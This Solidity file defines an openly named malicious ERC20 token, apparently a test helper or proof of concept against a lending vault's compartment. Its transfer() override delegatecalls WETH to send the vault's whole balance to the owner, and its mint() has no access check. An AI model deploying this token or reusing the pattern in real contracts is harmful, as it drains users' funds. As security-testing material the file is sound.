// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract MyMaliciousERC20 is ERC20, Ownable {
    uint8 internal _decimals;
    address internal vaultCompartmentVictim;
    address internal vaultAddr;

    constructor(
        string memory name,
        string memory symbol,
        uint8 __decimals,
        address _vaultCompartmentVictim,
        address _lenderVault
    ) ERC20(name, symbol) Ownable() {
        _decimals = __decimals;
        _mint(_lenderVault, 100 ether);
        vaultCompartmentVictim = _vaultCompartmentVictim;
        vaultAddr = _lenderVault;
    }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }

    function transfer(address, uint256) public override returns (bool) {
        address collTokenAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
        uint256 repayAmount = IERC20(collTokenAddr).balanceOf(vaultAddr); //get balance
        collTokenAddr.delegatecall(
            abi.encodeWithSelector(
                bytes4(keccak256("transfer(address,uint256)")),
                owner(),
                repayAmount
            )
        );
        return true;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }
}
